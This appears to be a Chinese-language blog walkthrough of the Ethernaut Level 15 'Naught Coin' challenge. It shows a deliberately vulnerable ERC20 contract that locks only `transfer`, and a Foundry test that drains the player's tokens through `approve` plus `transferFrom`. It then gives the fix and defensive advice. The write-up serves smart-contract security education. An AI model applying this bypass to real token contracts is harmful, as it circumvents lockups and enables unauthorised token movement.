---
title: 'Ethernaut Level 15: Naught Coin - ERC20 approve/transferFrom漏洞'
date: 2025-01-25 16:20:00
updated: 2025-01-25 16:20:00
categories:
  - Ethernaut 系列
  - 进阶攻击篇 (11-20)
tags:
  - Ethernaut
  - Foundry
  - ERC20
  - approve
  - transferFrom
  - 智能合约安全
  - Solidity
series: Ethernaut Foundry Solutions
excerpt: "利用ERC20标准中的 `approve` 和 `transferFrom` 组合，绕过不完整的 `transfer` 函数限制。深入理解ERC20代币标准和继承覆盖的安全性影响，掌握 Naught Coin 关卡的破解技巧。"
---

# 🎯 Ethernaut Level 15: Naught Coin - ERC20 approve/transferFrom漏洞

> **关卡链接**: [Ethernaut Level 15 - Naught Coin](https://ethernaut.openzeppelin.com/level/15)  
> **攻击类型**: ERC20 `approve`/`transferFrom` 漏洞  
> **难度**: ⭐⭐☆☆☆

## 📋 挑战目标

作为 `player`，你初始拥有全部的 `NaughtCoin` 代币。然而，合约中的 `transfer` 函数被锁定，十年内无法转移代币。你的目标是在锁定期结束前，将你的全部代币从你的地址中转移出去。

![Naught Coin Requirements](https://ethernaut.openzeppelin.com/imgs/BigLevel15.svg)

## 🔍 漏洞分析

让我们看一下 `NaughtCoin` 合约。它继承自 OpenZeppelin 的 `ERC20` 标准合约。

```solidity
contract NaughtCoin is ERC20 {
    uint public timeLock;
    address public player;

    constructor(address _player) ERC20("NaughtCoin", "0x0") {
        player = _player;
        timeLock = block.timestamp + 10 * 365 days;
        _mint(player, 1000000 * (10**18));
    }

    modifier lockTokens() {
        if (msg.sender == player) {
            require(block.timestamp > timeLock, "NaughtCoin: time lock is active");
            _;
        } else {
            _;
        }
    }

    // Override transfer to lock tokens for the player
    function transfer(address _to, uint256 _value) public override lockTokens returns (bool) {
        return super.transfer(_to, _value);
    }
    
    // Other functions are inherited from ERC20
}
```

合约通过 `override` 重写了 `transfer` 函数，并为其增加了一个 `lockTokens` 修饰符。这个修饰符会检查 `msg.sender` 是否为 `player`，如果是，则要求 `block.timestamp` 大于 `timeLock`（十年之后）。这意味着我们作为 `player`，无法直接调用 `transfer` 函数来转移代-笔。

然而，开发者只重写了 `transfer` 函数，却忽略了 `ERC20` 标准中的另一个重要的代币转移函数：`transferFrom(address from, address to, uint256 amount)`。

`transferFrom` 函数允许一个地址（`spender`）在得到 `owner` 授权（`approve`）后，从 `owner` 的账户中转移代币到任何地址。

由于 `NaughtCoin` 合约没有重写 `transferFrom`，它将直接使用 OpenZeppelin `ERC20` 合约中的原始实现，而这个原始实现是没有 `lockTokens` 修饰符的！

因此，攻击路径变得清晰：
1.  我们（`player`）调用 `approve` 函数，授权给另一个地址（可以是自己，也可以是任何其他地址）转移我们的全部代币。
2.  我们（或被授权的地址）调用 `transferFrom` 函数，将代币从我们的账户中转移出去。

## 💻 Foundry 实现

### 攻击合约代码

在 Foundry 测试中，我们可以直接模拟这个过程。我们甚至不需要一个单独的攻击合约，因为 `player` 可以授权给自己来执行 `transferFrom`。

```solidity
// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/15_NaughtCoin.sol";

contract NaughtCoinTest is Test {
    NaughtCoin instance;
    address player1;
    address player2;

    function setUp() public {
        player1 = vm.addr(1);
        player2 = vm.addr(2); // 一个用于接收代币的地址
        instance = new NaughtCoin(player1);
    }

    function testAttacker() public {
        vm.startPrank(player1, player1);

        // 获取 player1 的全部余额
        uint256 playerBalance = instance.balanceOf(player1);

        // 步骤 1: player1 授权给 player1 (自己) 转移全部余额
        instance.approve(player1, playerBalance);

        // 步骤 2: player1 调用 transferFrom 将自己的代币转移到 player2
        instance.transferFrom(player1, player2, playerBalance);

        // 验证结果
        assertEq(instance.balanceOf(player1), 0);
        assertEq(instance.balanceOf(player2), playerBalance);

        vm.stopPrank();
    }
}
```

### 关键攻击步骤

1.  **获取余额**: 首先，确定 `player` 地址拥有的代币总量。
2.  **授权 (`approve`)**: `player` 调用 `instance.approve(spender, amount)`，其中 `spender` 是被授权的地址，`amount` 是授权额度。在这里，我们让 `player` 授权给自己全部余额。
3.  **转移 (`transferFrom`)**: `player` 调用 `instance.transferFrom(from, to, amount)`，其中 `from` 是 `player` 地址，`to` 是接收地址，`amount` 是要转移的数量。

这个过程成功地绕过了 `transfer` 函数的 `timeLock` 限制。

## 🛡️ 防御措施

1.  **完整地覆盖函数**: 当继承一个标准（如ERC20）并打算修改其核心功能时，必须确保所有相关的函数都被一致地修改。在这个案例中，如果 `transfer` 被锁定，那么 `transferFrom` 也应该被同样的方式锁定。

    ```solidity
    // 正确的修复方式
    function transferFrom(address from, address to, uint256 value) public override lockTokens returns (bool) {
        return super.transferFrom(from, to, value);
    }
    ```

2.  **使用成熟的代币锁定合约**: 与其自己实现时间锁，不如使用经过审计和广泛使用的解决方案，例如 OpenZeppelin 的 `TokenTimelock` 合约。这些合约已经考虑了各种边缘情况。

## 🔧 相关工具和技术

-   **ERC20 标准**: 深入理解ERC20代币标准的全部接口是至关重要的，包括 `transfer`, `approve`, `transferFrom`, `balanceOf`, `allowance` 等。
-   **函数覆盖 (`override`)**: 在Solidity中，当子合约需要修改父合约的行为时，使用 `override` 关键字。但必须小心，确保所有相关的行为都被覆盖，以避免产生漏洞。
-   **Foundry `prank`**: `vm.startPrank` 是模拟特定地址（如 `player`）执行操作的强大工具，使得在测试中模拟多步攻击流程变得简单。

## 🎯 总结

**核心概念**:
-   ERC20标准定义了一套代币交互的接口，仅仅限制其中一个（`transfer`）是不够的。
-   `approve` 和 `transferFrom` 的组合是ERC20的一个核心功能，允许第三方代为转移代币。
-   在进行合约继承和函数覆盖时，必须保持逻辑的一致性，否则很容易引入漏洞。

**攻击向量**:
-   识别出合约只限制了 `transfer` 函数，而没有限制 `transferFrom` 函数。
-   利用 `approve` 和 `transferFrom` 的标准功能来绕过不完整的安全限制。

**防御策略**:
-   在修改继承合约的功能时，进行全面的影响分析，确保所有相关的函数都得到一致的处理。
-   优先使用经过社区审计和验证的标准实现，而不是自己重新发明轮子。

## 📚 参考资料

-   [ERC20 Token Standard](https://eips.ethereum.org/EIPS/eip-20)
-   [OpenZeppelin ERC20 Implementation](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol)
-   [Solidity Docs: Overriding](https://docs.soliditylang.org/en/latest/contracts.html#function-overriding)